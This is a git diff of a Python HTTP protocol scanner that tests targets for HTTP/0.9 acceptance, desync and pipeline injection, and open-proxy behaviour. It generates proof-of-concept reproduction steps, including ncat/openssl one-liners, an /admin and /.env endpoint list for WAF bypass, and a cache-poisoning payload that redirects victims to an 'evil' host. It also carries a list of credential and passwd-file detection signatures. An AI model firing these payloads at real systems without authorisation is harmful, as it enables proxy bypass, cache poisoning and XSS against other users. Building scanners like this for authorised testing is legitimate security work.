@@ -1,4 +1,11 @@
 #!/usr/bin/env python3
+"""
+HTTP Version & Protocol Analyzer
+---------------------------------
+Tests support for different HTTP versions on a target, detects
+misconfigurations (HTTP/0.9, pipeline injection, desync, open proxy)
+and analyzes sensitive content leaks.
+"""
 
 from __future__ import annotations
 
@@ -9,72 +16,137 @@ import ssl
 import zlib
 from typing import Any
 from concurrent.futures import ThreadPoolExecutor, as_completed
+from dataclasses import dataclass, field
 
 from utils.style import Colors
 from utils.utils import configure_logger, re, requests, time, urlparse
 
 logger = configure_logger(__name__)
 
+# ─────────────────────────────────────────────────────────────
+# Constants
+# ─────────────────────────────────────────────────────────────
 
 PROXY_PROBE_URL = "http://httpbin.org/get"
-PROXY_PROBE_MARKERS = [
-    "httpbin",
-    '"origin":',
-    "Kenneth Reitz",
-    '"Host": "httpbin.org"',
-    '"url": "http://httpbin.org',
-    "JSON",
-]
+PROXY_CONFIRM_URL = "http://httpbin.org/ip"
+PROXY_INVALID_URL = "http://this-domain-should-never-exist-xyz123456.invalid/nonexistent"
 
 DEFAULT_USER_AGENT = "python-requests/2.28.1"
 
-# Configuration des timeouts par défaut
-DEFAULT_SOCKET_TIMEOUT = 10
-DEFAULT_READ_TIMEOUT = 8
-DEFAULT_QUICK_TIMEOUT = 5
+TIMEOUT_SOCKET = 10
+TIMEOUT_READ = 8
+TIMEOUT_QUICK = 5
+
+VALID_HTTP_VERSIONS = {"HTTP/0.9", "HTTP/1.0", "HTTP/1.1", "HTTP/2", "HTTP/3"}
+
+# Versions to test (standard + malformed)
+TEST_VERSIONS = [
+    "HTTP/0.9", "HTTP/1.0", "HTTP/1.1", "HTTP/2", "HTTP/3",
+    "QUIC", "SHTTP/1.3",
+    "HTTP/1.2", "HTTP/1.6", "HTTP/4.0", "HTTP/99.9", "HTTP/1.1.1",
+    "HtTP/1.1", "INVALID/1.1", "", " HTTP/1.1", "HTTP/1.1 ",
+]
+
+# Critical leak signatures only
+# No generic words ("config", "password") that match in any HTML page
+CRITICAL_LEAK_SIGNATURES = [
+    (b"root:x:0:0", "Unix /etc/passwd"),
+    (b"[boot loader]", "Windows boot.ini"),
+    (b"aws_access_key", "AWS credentials"),
+    (b"private_key", "Private key material"),
+    (b"-----begin rsa", "RSA private key"),
+    (b"-----begin openssh", "SSH private key"),
+    (b"mysql_connect(", "DB credentials in source"),
+    (b"db_password", "Database password"),
+    (b"api_key", "API key exposure"),
+    (b"secret_key", "Secret key exposure"),
+    (b"index of /", "Directory listing"),
+    (b"<title>phpinfo", "PHP info page"),
+]
+
+# Error response signatures (false positives)
+ERROR_SIGNATURES = [
+    b"400 bad request",
+    b"404 not found",
+    b"405 method not allowed",
+    b"500 internal server error",
+    b"502 bad gateway",
+    b"503 service unavailable",
+    b"connection closed",
+    b"invalid request",
+]
 
 
-def parse_target(url: str) -> tuple[str, str | None, int, str]:
-    """Parse une URL et retourne ses composants (scheme, host, port, path)"""
-    u = urlparse(url)
-    scheme = u.scheme or "http"
-    host = u.hostname
-    path = u.path or "/"
-    if u.query:
-        path = f"{path}?{u.query}"
-    port = u.port or (443 if scheme == "https" else 80)
-    return scheme, host, port, path
+# ─────────────────────────────────────────────────────────────
+# Data classes
+# ─────────────────────────────────────────────────────────────
+
+@dataclass
+class ParsedURL:
+    """Parsed URL components."""
+
+    scheme: str
+    host: str | None
+    port: int
+    path: str
+
+    @classmethod
+    def from_url(cls, url: str) -> ParsedURL:
+        u = urlparse(url)
+        scheme = u.scheme or "http"
+        host = u.hostname
+        path = u.path or "/"
+        if u.query:
+            path = f"{path}?{u.query}"
+        port = u.port or (443 if scheme == "https" else 80)
+        return cls(scheme=scheme, host=host, port=port, path=path)
+
+    @property
+    def is_https(self) -> bool:
+        return self.scheme == "https"
 
 
-def detect_http_version_support(url: str) -> list[str]:
-    """Détecte les versions HTTP supportées via ALPN"""
-    try:
-        scheme, host, port, path = parse_target(url)
-        if scheme != "https":
-            return []
+@dataclass
+class VersionProbeResult:
+    """Result of an HTTP version probe."""
 
-        raw = socket.create_connection((host, port), timeout=DEFAULT_SOCKET_TIMEOUT)
-        ctx = ssl.create_default_context()
-        ctx.check_hostname = False
-        ctx.verify_mode = ssl.CERT_NONE
-        ctx.set_alpn_protocols(["h2", "http/1.1"])
-
-        ssock = ctx.wrap_socket(raw, server_hostname=host)
-        selected_protocol = ssock.selected_alpn_protocol()
-        ssock.close()
-
-        if selected_protocol:
-            return [selected_protocol]
-        return []
-    except Exception:
-        return []
+    version: str
+    code: int | None = None
+    size: int = 0
+    first_line: str = ""
+    flags: list[str] = field(default_factory=list)
+    accepted: bool = False
+    server: str = ""
 
 
-def make_tls_socket(
-    host: str | None, port: int, *, force_h1: bool = False, timeout: int = DEFAULT_SOCKET_TIMEOUT
-) -> ssl.SSLSocket:
-    """Crée un socket TLS configuré"""
-    raw = socket.create_connection((host, port), timeout=timeout)
+@dataclass
+class VulnTestResult:
+    """Result of a vulnerability test."""
+
+    name: str
+    vulnerable: bool = False
+    reason: str = ""
+    confidence: int = 0
+    response_preview: str = ""
+    poc: list[str] = field(default_factory=list)
+    content_leaks: list[str] = field(default_factory=list)
+
+
+# ─────────────────────────────────────────────────────────────
+# Network helpers
+# ─────────────────────────────────────────────────────────────
+
+def create_socket(
+    target: ParsedURL,
+    *,
+    force_h1: bool = False,
+    timeout: int = TIMEOUT_SOCKET,
+) -> socket.socket | ssl.SSLSocket:
+    """Creates a TCP or TLS socket to the target."""
+    raw = socket.create_connection((target.host, target.port), timeout=timeout)
+    if not target.is_https:
+        return raw
+
     ctx = ssl.create_default_context()
     ctx.check_hostname = False
     ctx.verify_mode = ssl.CERT_NONE
@@ -83,25 +155,26 @@ def make_tls_socket(
             ctx.set_alpn_protocols(["http/1.1"])
         except Exception:
             pass
-    ssock = ctx.wrap_socket(raw, server_hostname=host)
-    return ssock
+    return ctx.wrap_socket(raw, server_hostname=target.host)
 
 
 def send_recv(
     sock: socket.socket | ssl.SSLSocket,
     data: bytes | None,
-    read_timeout: int = DEFAULT_READ_TIMEOUT,
-    expect_more: bool = False,
+    read_timeout: int = TIMEOUT_READ,
 ) -> bytes:
-    """Envoie des données et lit la réponse avec gestion intelligente du Content-Length"""
+    """Sends data and reads the full response.
+
+    Handles Content-Length, Transfer-Encoding: chunked, and graceful timeout.
+    """
     sock.settimeout(read_timeout)
     if data:
         sock.sendall(data)
     time.sleep(0.1)
 
-    buff = b""
-    headers_complete = False
-    content_length = None
+    buf = b""
+    headers_done = False
+    content_length: int | None = None
     is_chunked = False
 
     try:
@@ -110,783 +183,921 @@ def send_recv(
                 chunk = sock.recv(8192)
                 if not chunk:
                     break
-                buff += chunk
+                buf += chunk
 
-                # Parse headers une seule fois
-                if not headers_complete and b"\r\n\r\n" in buff:
-                    headers_complete = True
-                    header_part = buff.split(b"\r\n\r\n")[0]
-                    
-                    for line in header_part.split(b"\r\n"):
-                        line_lower = line.lower()
-                        if line_lower.startswith(b"content-length:"):
+                if not headers_done and b"\r\n\r\n" in buf:
+                    headers_done = True
+                    header_section = buf.split(b"\r\n\r\n")[0].lower()
+
+                    for line in header_section.split(b"\r\n"):
+                        if line.startswith(b"content-length:"):
                             try:
                                 content_length = int(line.split(b":")[1].strip())
-                            except Exception:
+                            except ValueError:
                                 pass
-                        elif line_lower.startswith(b"transfer-encoding:") and b"chunked" in line_lower:
+                        elif line.startswith(b"transfer-encoding:") and b"chunked" in line:
                             is_chunked = True
 
-                # Arrêt si Content-Length atteint
-                if headers_complete and content_length is not None and not is_chunked:
-                    body_start = buff.find(b"\r\n\r\n") + 4
-                    if len(buff) - body_start >= content_length:
+                if headers_done and content_length is not None and not is_chunked:
+                    body_offset = buf.find(b"\r\n\r\n") + 4
+                    if len(buf) - body_offset >= content_length:
                         break
-                
-                # Pour chunked encoding, chercher le marqueur de fin
-                if headers_complete and is_chunked and buff.endswith(b"0\r\n\r\n"):
+
+                if headers_done and is_chunked and buf.endswith(b"0\r\n\r\n"):
                     break
 
-            except socket.timeout:
+            except (socket.timeout, OSError):
                 break
-            except Exception:
-                break
-
     except Exception:
         pass
 
-    return buff
+    return buf
 
 
-def analyze_response_headers(response_data: bytes) -> dict[str, str | None]:
-    """Analyse les headers HTTP de la réponse"""
+# ─────────────────────────────────────────────────────────────
+# HTTP response parsing
+# ─────────────────────────────────────────────────────────────
+
+def parse_status_line(raw: bytes) -> tuple[str, int | None]:
+    """Extracts the status line and HTTP code."""
     try:
-        header_end = response_data.find(b"\r\n\r\n")
-        if header_end == -1:
-            return {}
-
-        headers_part = response_data[:header_end].decode("utf-8", errors="ignore")
-        headers = {}
-
-        for line in headers_part.split("\r\n")[1:]:  # Skip status line
-            if ":" in line:
-                key, value = line.split(":", 1)
-                headers[key.strip().lower()] = value.strip()
-
-        info = {
-            "server": headers.get("server", "Unknown"),
-            "content_type": headers.get("content-type", "Unknown"),
-            "content_encoding": headers.get("content-encoding"),
-            "transfer_encoding": headers.get("transfer-encoding"),
-            "connection": headers.get("connection", "Unknown"),
-            "upgrade": headers.get("upgrade"),
-            "cache_control": headers.get("cache-control"),
-            "x_powered_by": headers.get("x-powered-by"),
-        }
-
-        return info
-    except Exception:
-        return {}
-
-
-def decompress_if_needed(response_data: bytes, url: str | None = None) -> bytes:
-    """Décompresse la réponse si nécessaire (gzip/deflate)"""
-    if url:
-        print(" ├── ALPN Protocol Detection:")
-        alpn_versions = detect_http_version_support(url)
-        for ver in alpn_versions:
-            print(f" │   └─ {ver}")
-        if not alpn_versions:
-            print(" │   └─ No ALPN protocols detected")
-
-    try:
-        header_end = response_data.find(b"\r\n\r\n")
-        if header_end == -1:
-            return response_data
-
-        headers_part = response_data[:header_end].lower()
-        body_part = response_data[header_end + 4 :]
-
-        if b"content-encoding: gzip" in headers_part:
-            try:
-                decompressed_body = gzip.decompress(body_part)
-                return response_data[: header_end + 4] + decompressed_body
-            except Exception:
-                pass
-        elif b"content-encoding: deflate" in headers_part:
-            try:
-                decompressed_body = zlib.decompress(body_part)
-                return response_data[: header_end + 4] + decompressed_body
-            except Exception:
-                pass
-        elif b"content-encoding: br" in headers_part:
-            try:
-                import brotli
-                decompressed_body = brotli.decompress(body_part)
-                return response_data[: header_end + 4] + decompressed_body
-            except (ImportError, Exception):
-                pass
-
-    except Exception:
-        pass
-
-    return response_data
-
-
-def first_line_and_code(resp: bytes) -> tuple[str, int | None]:
-    """Extrait la première ligne et le code de statut HTTP"""
-    try:
-        line = resp.split(b"\r\n", 1)[0][:200]
+        line = raw.split(b"\r\n", 1)[0][:200]
         m = re.search(rb"HTTP/\d\.\d\s+(\d+)", line)
         return line.decode(errors="replace"), int(m.group(1)) if m else None
     except Exception:
-        return (resp[:80].decode(errors="replace"), None)
+        return raw[:80].decode(errors="replace"), None
 
 
-def sanitize_first_line(fl: Any) -> str:
-    """Nettoie la première ligne pour l'affichage"""
+def extract_server_header(raw: bytes) -> str:
+    """Extracts the Server header value from a raw HTTP response."""
+    header_end = raw.find(b"\r\n\r\n")
+    if header_end == -1:
+        return ""
+
+    try:
+        header_text = raw[:header_end].decode("utf-8", errors="ignore")
+    except Exception:
+        return ""
+
+    for line in header_text.split("\r\n")[1:]:
+        if ":" in line:
+            key, value = line.split(":", 1)
+            if key.strip().lower() == "server":
+                return value.strip()
+
+    return ""
+
+
+def decompress_body(raw: bytes) -> bytes:
+    """Decompresses body if Content-Encoding is gzip/deflate/br."""
+    header_end = raw.find(b"\r\n\r\n")
+    if header_end == -1:
+        return raw
+
+    header_part = raw[:header_end].lower()
+    body = raw[header_end + 4:]
+
+    decompressors: dict[bytes, Any] = {
+        b"content-encoding: gzip": lambda b: gzip.decompress(b),
+        b"content-encoding: deflate": lambda b: zlib.decompress(b),
+    }
+
+    try:
+        import brotli
+        decompressors[b"content-encoding: br"] = lambda b: brotli.decompress(b)
+    except ImportError:
+        pass
+
+    for marker, decompress_fn in decompressors.items():
+        if marker in header_part:
+            try:
+                return raw[:header_end + 4] + decompress_fn(body)
+            except Exception:
+                pass
+
+    return raw
+
+
+def sanitize_status_line(fl: str) -> str:
+    """Sanitizes the status line for display."""
     if not isinstance(fl, str):
         try:
             fl = str(fl)
         except Exception:
             return "Error"
-    s = fl.lstrip().upper()
-    
-    # Détection de réponses HTML/erreur
-    html_indicators = ["<!DOCTYPE", "<HTML", "<!DOCTYPE HTML", "<"]
-    if any(s.startswith(ind) for ind in html_indicators):
-        return "Error"
-    
-    if "�" in fl:
+
+    stripped = fl.lstrip().upper()
+    if any(stripped.startswith(tag) for tag in ("<!DOCTYPE", "<HTML", "<")):
+        return "Error (HTML response)"
+    if "\ufffd" in fl:
         return "Binary/Unknown"
-    
-    return str(fl)
+    return fl
 
 
-VALID_TOKENS = {"HTTP/0.9", "HTTP/1.0", "HTTP/1.1", "HTTP/2", "HTTP/3"}
+def has_error_signature(response: bytes) -> bool:
+    """Checks if the response contains error markers."""
+    lower = response.lower()
+    return any(sig in lower for sig in ERROR_SIGNATURES)
 
 
-def classify_version_token(v: str) -> list[str]:
-    """Classifie un token de version HTTP et détecte les anomalies"""
-    flags = []
-    if v == "":
-        flags.append("empty_version")
-        return flags
-    
-    if v != v.strip():
-        if v.startswith(" "):
+def get_response_body(raw: bytes) -> bytes:
+    """Extracts the body from an HTTP response."""
+    idx = raw.find(b"\r\n\r\n")
+    return raw[idx + 4:] if idx != -1 else raw
+
+
+def is_html_page(raw: bytes) -> bool:
+    """Checks if the response is a standard HTML page."""
+    body = get_response_body(raw).lstrip()[:200].lower()
+    return body.startswith((b"<!doctype html", b"<html", b"<head", b"<body"))
+
+
+# ─────────────────────────────────────────────────────────────
+# ALPN / HTTP version detection
+# ─────────────────────────────────────────────────────────────
+
+def detect_alpn_protocols(target: ParsedURL) -> list[str]:
+    """Detects supported HTTP protocols via ALPN (TLS only)."""
+    if not target.is_https:
+        return []
+    try:
+        raw = socket.create_connection(
+            (target.host, target.port), timeout=TIMEOUT_SOCKET
+        )
+        ctx = ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+        ctx.set_alpn_protocols(["h2", "http/1.1"])
+        ssock = ctx.wrap_socket(raw, server_hostname=target.host)
+        proto = ssock.selected_alpn_protocol()
+        ssock.close()
+        return [proto] if proto else []
+    except Exception:
+        return []
+
+
+def classify_version_token(version: str) -> list[str]:
+    """Detects anomalies in an HTTP version token.
+
+    Possible flags:
+    - empty_version   : empty token
+    - leading_space   : leading whitespace
+    - trailing_space  : trailing whitespace
+    - malformed       : control characters (tab, CR, LF)
+    - mixed_case      : incorrect casing (e.g. HtTP/1.1)
+    - invalid_token   : non-standard version
+    """
+    if version == "":
+        return ["empty_version"]
+
+    flags: list[str] = []
+
+    if version != version.strip():
+        if version.startswith(" "):
             flags.append("leading_space")
-        if v.endswith(" "):
+        if version.endswith(" "):
             flags.append("trailing_space")
-    
-    if any(ch in v for ch in ["\t", "\r", "\n"]):
+
+    if any(ch in version for ch in ("\t", "\r", "\n")):
         flags.append("malformed")
-    
-    if v.upper().startswith("HTTP/") and v != v.upper():
+
+    if version.upper().startswith("HTTP/") and version != version.upper():
         flags.append("mixed_case")
-    
-    if v not in VALID_TOKENS:
+
+    if version not in VALID_HTTP_VERSIONS:
         flags.append("invalid_token")
-    
+
     return flags
 
 
-def is_likely_http09_response(response: bytes) -> bool:
-    """Détermine si une réponse ressemble à du HTTP/0.9"""
-    if not response or len(response) == 0:
+# ─────────────────────────────────────────────────────────────
+# HTTP/0.9 probing
+# ─────────────────────────────────────────────────────────────
+
+def is_http09_response(response: bytes) -> bool:
+    """Determines if a response is HTTP/0.9.
+
+    HTTP/0.9 = no status line, no headers, just raw content.
+    """
+    if not response:
         return False
 
-    # HTTP/0.9 ne contient pas de headers
     if b"HTTP/" in response[:200]:
         return False
-
     if b"Content-Type:" in response[:500] or b"Server:" in response[:500]:
         return False
 
-    response_start = response[:500].lower()
-    html_indicators = [b"<!doctype", b"<html", b"<head", b"<body", b"<title"]
+    start = response[:500].lower()
 
-    if any(response_start.startswith(indicator) for indicator in html_indicators):
+    if any(start.startswith(tag) for tag in (
+        b"<!doctype", b"<html", b"<head", b"<body", b"<title"
+    )):
         return True
 
-    # Texte brut sans marqueur HTML
-    if not response_start.startswith(b"<") and len(response) > 10:
+    if len(response) > 10 and not start.startswith(b"<"):
         return True
 
     return False
 
 
-def probe_http_09(url: str) -> tuple[bool, bytes]:
-    """Teste le support HTTP/0.9 avec plusieurs variantes de requêtes"""
-    scheme, host, port, path = parse_target(url)
+def probe_http09(target: ParsedURL) -> tuple[bool, bytes]:
+    """Tests HTTP/0.9 support with 3 request variants.
 
-    tests = [
-        f"GET {path}\r\n\r\n",
-        f"GET {path}\n\n",
-        f"GET {path}",
+    Requires at least 2 positive results with similar responses
+    (MD5 hash) to confirm and avoid false positives.
+    """
+    request_variants = [
+        f"GET {target.path}\r\n\r\n",
+        f"GET {target.path}\n\n",
+        f"GET {target.path}",
     ]
 
-    results = []
+    results: list[tuple[bool, bytes]] = []
 
-    for request_template in tests:
+    for req_str in request_variants:
         try:
-            s: socket.socket | ssl.SSLSocket
-            if scheme == "https":
-                s = make_tls_socket(host, port, force_h1=True, timeout=DEFAULT_SOCKET_TIMEOUT)
-            else:
-                s = socket.create_connection((host, port), timeout=DEFAULT_SOCKET_TIMEOUT)
-
-            req = request_template.encode()
-            resp = send_recv(s, req, expect_more=True, read_timeout=12)
+            sock = create_socket(target, force_h1=True)
+            resp = send_recv(sock, req_str.encode(), read_timeout=12)
             time.sleep(0.05)
             try:
-                resp += s.recv(65535)
+                resp += sock.recv(65535)
             except Exception:
                 pass
-            s.close()
-
-            is_09 = is_likely_http09_response(resp)
-            results.append((is_09, resp, request_template))
-
+            sock.close()
+            results.append((is_http09_response(resp), resp))
         except Exception:
-            results.append((False, b"", request_template))
+            results.append((False, b""))
 
-    positive_results = [r for r in results if r[0]]
+    positives = [(ok, data) for ok, data in results if ok]
 
-    # Validation: au moins 2 résultats positifs similaires
-    if len(positive_results) >= 2:
-        response_hashes = [
-            hashlib.md5(r[1]).hexdigest()  # nosec B324 - MD5 pour comparaison uniquement
-            for r in positive_results
-        ]
-        if len(set(response_hashes)) <= 2:
-            return True, positive_results[0][1]
+    if len(positives) >= 2:
+        hashes = {
+            hashlib.md5(data).hexdigest()  # nosec B324
+            for _, data in positives
+        }
+        if len(hashes) <= 2:
+            return True, positives[0][1]
 
     return False, b""
 
 
-def validate_vulnerability_response(
-    response: bytes, test_name: str
-) -> tuple[bool, str]:
-    """Valide si une réponse indique une vulnérabilité réelle"""
-    if not response or len(response) < 10:
-        return False, "Empty or too short response"
+# ─────────────────────────────────────────────────────────────
+# PoC builders (shared helper)
+# ─────────────────────────────────────────────────────────────
 
-    false_positive_signatures = [
-        b"400 Bad Request",
-        b"404 Not Found",
-        b"405 Method Not Allowed",
-        b"500 Internal Server Error",
-        b"502 Bad Gateway",
-        b"503 Service Unavailable",
-        b"Connection closed",
-        b"Bad Request",
-        b"Invalid request",
+def _get_connect_cmd(target: ParsedURL) -> str:
+    """Returns the appropriate ncat/openssl command for the target."""
+    if target.is_https:
+        return f"openssl s_client -connect {target.host}:{target.port} -quiet"
+    return f"ncat {target.host} {target.port}"
+
+
+def _get_python_socket_lines(target: ParsedURL) -> tuple[str, list[str]]:
+    """Returns (import_suffix, ssl_wrap_lines) for Python PoC snippets."""
+    if not target.is_https:
+        return "", []
+    return ", ssl", [
+        '  ctx = ssl.create_default_context()',
+        '  ctx.check_hostname = False',
+        '  ctx.verify_mode = ssl.CERT_NONE',
+        f'  s = ctx.wrap_socket(s, server_hostname="{target.host}")',
     ]
 
-    response_lower = response.lower()
-    for fp_sig in false_positive_signatures:
-        if fp_sig.lower() in response_lower:
-            return False, f"False positive detected: {fp_sig.decode()}"
 
-    if test_name == "desync_injection":
-        if b"200 OK" in response and len(response) > 100:
-            return True, "Potential desync injection successful"
-        return False, "No evidence of successful desync"
+# ─────────────────────────────────────────────────────────────
+# Vulnerability tests (when HTTP/0.9 is supported)
+# ─────────────────────────────────────────────────────────────
 
-    elif test_name == "pipeline_possible":
-        if response.count(b"HTTP/") > 1:
-            return True, "Multiple HTTP responses detected"
-        if b"/admin" in response_lower or b"unauthorized" in response_lower:
-            return True, "Admin path accessed or security response"
-        return False, "No evidence of pipeline vulnerability"
+def test_desync_injection(target: ParsedURL) -> VulnTestResult:
+    """Tests desync injection via HTTP/0.9.
 
-    elif test_name == "proxy_path_confusion":
-        return False, "Marker-based validation required"
+    Sends a malformed request that attempts to inject a fake HTTP response
+    into the stream. Only vulnerable if the server returns 200 OK
+    with no error signature.
+    """
+    result = VulnTestResult(name="desync_injection")
 
-    return len(response) > 50, "Response analysis inconclusive"
+    try:
+        payload = f"GET {target.path}\n\rHTTP/1.1 200 OK\n\r\n\r".encode()
+
+        sock = create_socket(target, force_h1=True)
+        resp = send_recv(sock, payload)
+        sock.close()
+
+        _, code = parse_status_line(resp)
+
+        if not resp or len(resp) < 10:
+            result.reason = "Empty or too short response"
+        elif has_error_signature(resp):
+            result.reason = "Server rejected the malformed request"
+        elif code == 200 and len(resp) > 100:
+            result.vulnerable = True
+            result.confidence = 70
+            result.reason = "Server returned 200 OK to desync payload"
+            result.response_preview = resp[:300].decode(errors="replace")
+            result.poc = _build_desync_poc(target)
+        else:
+            result.reason = f"No desync evidence (code={code})"
+
+    except Exception as e:
+        result.reason = f"Error: {e.__class__.__name__}"
+
+    return result
 
 
-def analyze_proxy_response(response: bytes) -> bool:
-    """Analyse stricte de la réponse pour détecter un comportement de proxy"""
-    if not response or len(response) < 100:
+def _build_desync_poc(target: ParsedURL) -> list[str]:
+    """Generates reproduction instructions for desync injection."""
+    path = target.path
+    connect = _get_connect_cmd(target)
+    ssl_imp, ssl_lines = _get_python_socket_lines(target)
+
+    return [
+        "DESYNC INJECTION via HTTP/0.9",
+        "",
+        "Description:",
+        "  The server accepts malformed HTTP/0.9 requests containing",
+        "  an injected fake HTTP response. If a reverse proxy or cache",
+        "  sits in front, this can cause a desync between the proxy and",
+        "  backend, allowing arbitrary content to be served to other",
+        "  users (cache poisoning, response splitting).",
+        "",
+        "Impact:",
+        "  - Cache poisoning (serve malicious content to other users)",
+        "  - HTTP response splitting / header injection",
+        "  - Session hijacking via injected Set-Cookie",
+        "  - Stored XSS via poisoned cache",
+        "",
+        "Reproduce with ncat/openssl:",
+        f"  $ printf 'GET {path}\\n\\rHTTP/1.1 200 OK\\n\\r\\n\\r' | {connect}",
+        "",
+        "Reproduce with Python:",
+        f'  import socket{ssl_imp}',
+        f'  s = socket.create_connection(("{target.host}", {target.port}))',
+        *ssl_lines,
+        f'  s.sendall(b"GET {path}\\n\\rHTTP/1.1 200 OK\\n\\r\\n\\r")',
+        '  print(s.recv(4096))',
+        "",
+        "Advanced exploitation (cache poisoning):",
+        f'  payload = (b"GET {path}\\n\\r"',
+        '             b"HTTP/1.1 200 OK\\r\\n"',
+        '             b"Content-Type: text/html\\r\\n"',
+        '             b"Content-Length: 44\\r\\n\\r\\n"',
+        '             b"<script>document.location=\\"http://evil\\"</script>")',
+        "",
+        "Verification:",
+        "  If the response contains the injected content (200 OK + custom body),",
+        "  the server is vulnerable to desync. Then test with a cache/CDN in",
+        "  front to confirm the real-world impact.",
+    ]
+
+
+def test_pipeline_injection(target: ParsedURL) -> VulnTestResult:
+    """Tests pipeline injection via HTTP/0.9.
+
+    Sends two GET requests in a single TCP stream. The ONLY reliable
+    proof of pipeline is the presence of MULTIPLE distinct HTTP status
+    lines in the response (e.g. "HTTP/1.1 200" appears 2+ times).
+
+    A simple HTML page containing "/admin" or "config" is NOT
+    evidence of pipeline -- it's just normal HTML content.
+    """
+    result = VulnTestResult(name="pipeline_injection")
+
+    try:
+        payload = f"GET {target.path}\n\rGET /admin\n\r".encode()
+
+        sock = create_socket(target, force_h1=True)
+        resp = send_recv(sock, payload)
+        sock.close()
+
+        if not resp or len(resp) < 10:
+            result.reason = "Empty or too short response"
+            return result
+
+        if has_error_signature(resp):
+            result.reason = "Server rejected the pipeline request"
+            return result
+
+        # Only reliable proof: multiple HTTP status lines in the stream
+        http_responses = re.findall(rb"HTTP/\d\.\d\s+\d{3}", resp)
+
+        if len(http_responses) > 1:
+            result.vulnerable = True
+            result.confidence = 85
+            result.reason = (
+                f"Multiple HTTP responses detected "
+                f"({len(http_responses)} status lines)"
+            )
+            result.response_preview = resp[:500].decode(errors="replace")
+            result.poc = _build_pipeline_poc(target, len(http_responses))
+        else:
+            result.reason = "Single response only -- no pipeline execution"
+
+    except Exception as e:
+        result.reason = f"Error: {e.__class__.__name__}"
+
+    return result
+
+
+def _build_pipeline_poc(target: ParsedURL, nb_responses: int) -> list[str]:
+    """Generates reproduction instructions for pipeline injection."""
+    path = target.path
+    scheme = "https" if target.is_https else "http"
+    connect = _get_connect_cmd(target)
+    ssl_imp, ssl_lines = _get_python_socket_lines(target)
+
+    return [
+        "PIPELINE INJECTION via HTTP/0.9",
+        "",
+        "Description:",
+        "  The server processes multiple requests sent in a single TCP",
+        "  stream without HTTP version (0.9 format). Each request gets its",
+        f"  own response ({nb_responses} HTTP status lines detected in the stream).",
+        "  This allows accessing endpoints normally protected by a reverse",
+        "  proxy or WAF that doesn't understand this format.",
+        "",
+        "Impact:",
+        "  - WAF / reverse proxy rule bypass (path-based ACL)",
+        "  - Access to internal endpoints (/admin, /debug, /actuator...)",
+        "  - Information disclosure via unprotected endpoints",
+        "  - Potential request smuggling if upstream proxy present",
+        "",
+        "Reproduce with ncat/openssl:",
+        f"  $ printf 'GET {path}\\n\\rGET /admin\\n\\r' | {connect}",
+        "",
+        "  If you see 2+ 'HTTP/1.x ...' blocks in the response,",
+        "  the server processed both requests independently.",
+        "",
+        "Reproduce with Python:",
+        f'  import socket{ssl_imp}, re',
+        f'  s = socket.create_connection(("{target.host}", {target.port}))',
+        *ssl_lines,
+        f'  s.sendall(b"GET {path}\\n\\rGET /admin\\n\\r")',
+        '  resp = s.recv(65535)',
+        "  print(f'Responses: {len(re.findall(rb\"HTTP/\\\\d\\\\.\\\\d\\\\s+\\\\d{3}\", resp))}')",
+        "",
+        "Endpoints to test as 2nd request:",
+        "  GET /admin              GET /debug",
+        "  GET /actuator/env       GET /server-status",
+        "  GET /.env               GET /wp-admin",
+        "  GET /api/internal       GET /graphql",
+        "",
+        "Compare with curl (no pipeline):",
+        f"  $ curl -k -v {scheme}://{target.host}:{target.port}/admin",
+        "  If curl returns 403 but the pipeline returns 200,",
+        "  this confirms a reverse proxy / WAF bypass.",
+    ]
+
+
+def test_open_proxy(target: ParsedURL) -> VulnTestResult:
+    """Tests if the server acts as an open proxy (forward proxy).
+
+    3-step validation to eliminate false positives:
+
+    1. Send GET http://httpbin.org/get as absolute URL
+       -> Check for httpbin-specific JSON markers (origin, url, headers)
+
+    2. Confirmation with GET http://httpbin.org/ip (different endpoint)
+       -> Must return a small JSON {"origin": "x.x.x.x"}
+
+    3. Anti false-positive: GET http://invalid-domain/
+       -> If server returns 200 here too, it's a false positive
+
+    Confidence score:
+    - 50 if step 1 matches
+    - +50 if step 2 confirms
+    - = 0 if step 3 detects false positive
+    """
+    result = VulnTestResult(name="open_proxy")
+
+    try:
+        probe_host = urlparse(PROXY_PROBE_URL).hostname or ""
+        if probe_host.lower() == (target.host or "").lower():
+            result.reason = "Skipped -- target is httpbin itself"
+            return result
+
+        # Step 1: main test with httpbin.org/get
+        payload = (
+            f"GET {PROXY_PROBE_URL}\r\n"
+            f"Host: httpbin.org\r\n\r\n"
+        ).encode()
+
+        sock = create_socket(target, force_h1=True)
+        resp = send_recv(sock, payload)
+        sock.close()
+
+        step1_valid = _analyze_proxy_response(resp)
+
+        # Step 2: confirmation with httpbin.org/ip
+        step2_confirmed = False
+        if step1_valid:
+            step2_confirmed = _confirm_proxy_with_ip(target)
+
+        # Step 3: anti false-positive
+        is_false_positive = False
+        if step1_valid:
+            is_false_positive = _check_proxy_false_positive(target)
+
+        # Verdict
+        if is_false_positive:
+            result.confidence = 0
+            result.reason = (
+                "False positive -- server responds 200 to invalid URLs too"
+            )
+        elif step1_valid and step2_confirmed:
+            result.vulnerable = True
+            result.confidence = 100
+            result.reason = "Confirmed open proxy (double validation)"
+            result.response_preview = resp[:500].decode(errors="replace")
+            result.poc = _build_proxy_poc(target)
+        elif step1_valid:
+            result.confidence = 50
+            result.reason = (
+                "Partial match -- httpbin markers found "
+                "but confirmation failed"
+            )
+        else:
+            result.reason = "Response doesn't match proxy behavior"
+
+    except Exception as e:
+        result.reason = f"Error: {e.__class__.__name__}"
+
+    return result
+
+
+def _analyze_proxy_response(resp: bytes) -> bool:
+    """Checks that the response contains httpbin-specific markers."""
+    if not resp or len(resp) < 100:
         return False
-    
-    first_line, code = first_line_and_code(response)
+
+    _, code = parse_status_line(resp)
     if code != 200:
         return False
-    
-    # Marqueurs spécifiques httpbin.org
-    specific_markers = [
+
+    lower = resp.lower()
+
+    if any(tag in lower for tag in (
+        b"<html", b"<!doctype", b"error", b"exception"
+    )):
+        return False
+
+    marker_pairs = [
         (b'"origin":', b'"url": "http://httpbin.org/get"'),
         (b'"args": {}', b'"headers": {'),
-        (b'"User-Agent":', b'"Accept-Encoding":'),
+        (b'"user-agent":', b'"accept-encoding":'),
     ]
-    
-    response_lower = response.lower()
-    marker_hits = 0
-    
-    for marker_pair in specific_markers:
-        if all(marker in response_lower for marker in marker_pair):
-            marker_hits += 1
-    
-    # Élimination des faux positifs
-    false_positive_indicators = [
-        b"404 not found",
-        b"403 forbidden", 
-        b"error",
-        b"exception",
-        b"<html",
-        b"<!doctype",
-    ]
-    
-    for indicator in false_positive_indicators:
-        if indicator in response_lower:
-            return False
-    
-    return marker_hits >= 2
